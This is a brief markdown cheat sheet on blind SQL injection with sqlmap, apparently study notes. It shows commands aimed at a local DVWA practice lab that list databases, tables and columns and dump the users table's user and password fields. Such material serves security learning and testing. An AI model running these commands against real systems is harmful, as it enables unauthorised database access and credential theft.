## SQL-Injections 
#### SQL (Blind) Injection example   
`sqlmap -u "url-of-attack" --cookie="full cookie name"`  

ex.  
`sqlmap -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#' --cookie="security=low; PHPSESSID=aadfsfsasfsdffsffsdfs"`  
options--
`--dbs`  list databases  
`-D dvwa --tables`  list all tables in the dvwa database  
`-T users --column`  list all columns in table users  
`-C user,password --dump`